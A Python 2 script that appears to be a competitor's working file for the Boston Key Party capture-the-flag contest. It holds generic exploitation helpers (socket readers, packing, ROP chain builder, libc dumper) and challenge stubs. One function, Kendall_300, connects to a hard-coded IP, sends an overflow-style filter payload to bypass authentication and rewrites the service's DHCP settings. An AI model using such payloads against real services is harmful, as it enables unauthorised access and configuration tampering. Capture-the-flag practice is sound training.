__author__ = 'HuyNA'
import struct
import socket
import telnetlib
import hexdump
import time
import hashlib

def DumpLibc(s):
    libc_file = open("libc.dump", "wb")
    libc_buffer = ""
    data = s.recv(0x100)
    libc_buffer = data
    i=0
    try:
        while(len(data) >= 1):
            data = s.recv(0x100)
            libc_buffer += data
            time.sleep(0.01)
            print(i)
            i += 1
    finally:
        libc_file.write(libc_buffer)

def recv_until(sock, delim):
    buf = ""
    while True:
        c = sock.recv(1)
        buf += c
        if delim in buf:
            break
    return buf
#
def readuntil(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
        data += f.read(1)
    return data

def beauty_print(data):
    hexdump.hexdump(data)

def read_hex(data):
    return hexdump.restore(data)

# from '\x11\x22' => '1122'
def print_hex_string(data):
    return data.encode('hex')

pq = lambda v: struct.pack('<Q', v)

def pq(v):
    return struct.pack('<Q', v)

def uq(v):
    return struct.unpack('<Q', v)[0]

def pi(v):
    return struct.pack('<I', v)

def ui(v):
    return struct.unpack('<I', v)[0]

def xor_encrypt(data, key):
    decode_string = ''
    for i in range(len(data)):
        decode_string += chr((ord(data[i])^ord(key[i%len(key)]))&0xFF)
    return decode_string

def write_file(file_name, content):
    f = open(file_name,'wb')
    f.write(content)
    f.close()

def read_file(file_name):
    f = open(file_name, 'rb')
    content = ''
    byte = f.read(1)
    while byte != b"":
        content += byte
        byte = f.read(1)
    f.close()
    return content

def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()
def demo():
    data='00 11 22 33 44 55 66 77  88 99 AA BB CC DD EE FF'
    a = read_hex(data)
    print a.encode('hex')
    print type(a)
    beauty_print('kdfjiefoefjkafjieo\x11\x12')
def demo_sha1(data):
    print hashlib.sha1(data).hexdigest()
def convert_format(rop_array_number):
    rop = ''
    size = len(rop_array_number)
    for i in range(size):
        rop += struct.pack('<I', rop_array_number[i])
    return rop

def Andrew_275():
    '''
Andrew

we have an EXPERIMENTAL CDN based on nginx. It can optimize html, javascript, leetify text and rehost images. It is up at http://54.88.83.98:8080/ flag is in /tmp/flag : 275
    '''
def CentralSquare_200():
    '''

Central Square - http://54.152.100.187/ - web

Check out our new image filter! : 200
    '''

def Kendall_300():
    '''

Kendall

52.0.164.37:8888 : 300
    '''

    '''
     h  show this help\n
     a  authenticate\n
     c  config menu\n
     d  dhcp lease menu\n
     e  exit\n

     h  show this help\n
     r  renew leases\n
     l  list leases\n
     f  filter leases\n
     m  return to main menu\n
    '''
    s = socket.create_connection(('52.0.164.37',8888))
    #s = socket.create_connection(('192.168.248.138',8888))

    print '[+] d  dhcp lease menu '
    print recv_until(s,']# ')
    s.send('d\n')

    print '[+]  f  filter leases'
    print recv_until(s,'# ')
    s.send('f\n')
    print recv_until(s,'Enter filter condition: ')
    buf = '\x01'*0x7e+'\x02'+'\x03'+'\n'
    s.send(buf)

    print recv_until(s, '$ ')
    s.send('r\n')

    print '[+] authenticated ...'
    print recv_until(s, '$ ')
    s.send('m\n')
    print recv_until(s, '$ ')
    s.send('c\n')

    print recv_until(s, '$ ')
    s.send('l\n')

    print '[+] change start ip ... '
    print recv_until(s, '$ ')
    s.send('s\n')
    print recv_until(s, 'New Value: ')
    command1 = '192.168.011.000'+'\n'
    s.send(command1)

    print recv_until(s, '$ ')
    s.send('e\n')
    print recv_until(s, 'New Value: ')
    command1 = '192.168.011.200'+'\n'
    s.send(command1)

    print recv_until(s, '$ ')
    s.send('k\n')
    print recv_until(s, 'New Value: ')
    command1 = '255.255.255.000'+'\n'
    s.send(command1)

    print recv_until(s, '$ ')
    s.send('n\n')
    print recv_until(s, 'New Value: ')
    command1 = '8.8.8.8'+'\n'
    s.send(command1)

    print '[+] return to dhcp state ... '
    print recv_until(s, '$ ')
    s.send('m\n')
    print recv_until(s, '$ ')
    s.send('d\n')

    print '[+] renew leases ... '
    print recv_until(s, '$ ')
    s.send('r\n')

    print '[+] list key/values'
    print recv_until(s, '$ ')
    s.send('m\n')
    print recv_until(s, '$ ')
    s.send('c\n')
    print recv_until(s, '$ ')
    s.send('l\n')

    print recv_until(s, '$ ')
    s.send('m\n')
    print recv_until(s, '$ ')
    s.send('d\n')
    print recv_until(s, '$ ')
    s.send('l\n')


    print recv_until(s, '$ ')
    #final_interact(s)


Kendall_300()


def Alewife_400():
    '''

Alewife

alewife.bostonkey.party 8888 : 400
    '''
    #
    s = socket.create_connection(('alewife.bostonkey.party',8888))
    #s = socket.create_connection(('192.168.248.137',8888))

def Braintree():
    '''
    Braintree
red : 300

The MBTA wrote a cool system. It\'s pretty bad though, sometimes the commands work, sometimes they don\'t... Exploit it. (tz flag) 54.165.91.92 8899

http://bostonkeyparty.net/zenhv-2011730956fede22479375cacaab880f
    '''

def QuincyCenter():
    '''
    Quincy Center
red : 100

The MBTA wrote a cool system. It\'s pretty bad though, sometimes the commands work, sometimes they don\'t... Exploit it. (uspace flag) 54.165.91.92 8899

http://bostonkeyparty.net/zenhv-2011730956fede22479375cacaab880f
    '''
def QuincyAdams():
    '''

Quincy Adams
red : 200

The MBTA wrote a cool system. It\'s pretty bad though, sometimes the commands work, sometimes they don\'t... Exploit it. (kspace flag) 54.165.91.92 8899

http://bostonkeyparty.net/zenhv-2011730956fede22479375cacaab880f
    '''